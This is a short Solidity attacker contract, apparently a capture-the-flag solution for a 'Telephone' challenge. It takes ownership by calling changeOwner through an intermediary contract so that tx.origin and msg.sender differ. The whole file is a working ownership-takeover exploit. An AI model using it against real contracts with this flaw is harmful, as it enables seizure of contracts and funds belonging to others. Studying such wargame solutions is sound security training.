pragma solidity ^0.7.3;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephone public challenge;

    constructor(address challengeAddress) {
        challenge = ITelephone(challengeAddress);
    }

    function attack() external payable {
        challenge.changeOwner(tx.origin);
    }

    receive() external payable {}
}
